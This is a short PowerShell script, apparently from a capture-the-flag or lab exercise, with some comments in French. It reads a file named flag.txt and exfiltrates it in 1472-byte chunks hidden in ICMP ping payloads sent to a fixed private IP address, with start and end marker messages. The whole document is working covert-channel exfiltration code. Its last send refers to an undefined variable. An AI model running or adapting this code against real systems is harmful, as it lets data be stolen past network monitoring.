    $IP = "192.168.116.129"
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $true
    #$PingOptions.Ttl = 10
    
    # Division des trames par paquet de 1472 (1500 MTU - 20 (IP header) - 8 (ICMP header) = 1472)
    [int]$bufSize = 1472
    $inFile = "flag.txt"
    

    $stream = [System.IO.File]::OpenRead($inFile)
    $chunkNum = 0
    $TotalChunks = [math]::floor($stream.Length / 1472)
    $barr = New-Object byte[] $bufSize
    
    # Start of Transfer
    $sendbytes = ([text.encoding]::ASCII).GetBytes("You shall not pass")
    $ICMPClient.Send($IP,10, $sendbytes, $PingOptions) | Out-Null


    while ($bytesRead = $stream.Read($barr, 0, $bufsize)) {
        $ICMPClient.Send($IP,10, $barr, $PingOptions) | Out-Null
        $ICMPClient.PingCompleted
        
        #Missing check if transfer is okay, added sleep.
        sleep 1
        #$ICMPClient.SendAsync($IP,60 * 1000, $barr, $PingOptions) | Out-Null
        Write-Output "Done with $chunkNum out of $TotalChunks"
        $chunkNum += 1
    }

    # End the transfer
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Well, well, apparently you passed...")
    $ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null
    Write-Output "File Transfered"